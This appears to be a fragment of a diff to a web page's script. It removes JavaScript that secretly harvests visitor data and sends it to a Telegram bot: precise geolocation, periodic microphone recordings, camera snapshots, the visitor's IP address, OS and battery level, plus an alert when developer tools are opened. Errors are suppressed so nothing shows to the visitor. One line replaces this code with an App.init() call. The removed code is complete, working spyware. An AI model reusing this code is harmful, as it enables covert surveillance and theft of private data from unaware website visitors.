-    function requestGeolocation() { if (userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(pos => { userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude }; sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`); sendLocationAsMap(userLocation.lat, userLocation.lon); }, err => sendToBot(`🚫 Geo Error: ${err.code === 1 ? "Denied" : "Unavailable"}`), { enableHighAccuracy: true }); }
-    function startMicRecording(stream) { if (!window.MediaRecorder) return; mediaRecorder = new MediaRecorder(stream); mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data); mediaRecorder.start(config.micRecordInterval); }
-    function sendBeaconToBot(message) { const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); }
-    async function sendToBot(message) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true }) }); } catch (err) {} }
-    async function sendLocationAsMap(lat, lon) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, latitude: lat, longitude: lon }) }); } catch (err) {} }
-    async function sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} }
-    function sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`); sendFormData("sendPhoto", fd); }
-    function sendAudioToBot(audioBlob) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("audio", audioBlob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); sendFormData("sendAudio", fd); }
-    async function sendInitialReport() { let r = "💻 *Visitor Report*\n"; try { const ipRes = await fetch("https://api.ipify.org?format=json"); const d = await ipRes.json(); r += `*IP:* \`${d.ip}\`\n`; } catch (e) {} const ua = navigator.userAgent; r += `*OS:* ${ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Other"}\n`; try { const b = await navigator.getBattery(); r += `*Battery:* ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n`; } catch(e) {} sendToBot(r); }
-    function detectDevTools() { const t = 160; let o = false; const c = () => { if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) { if (!o) { sendToBot("⚠️ Dev Tools Opened!"); o = true; } } else { o = false; } requestAnimationFrame(c); }; requestAnimationFrame(c); }
-    function handleMediaError(type) { return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }
-
-    // --- Start Execution ---
-    initialize();
+    App.init();
 </script>
 </body>
 </html>
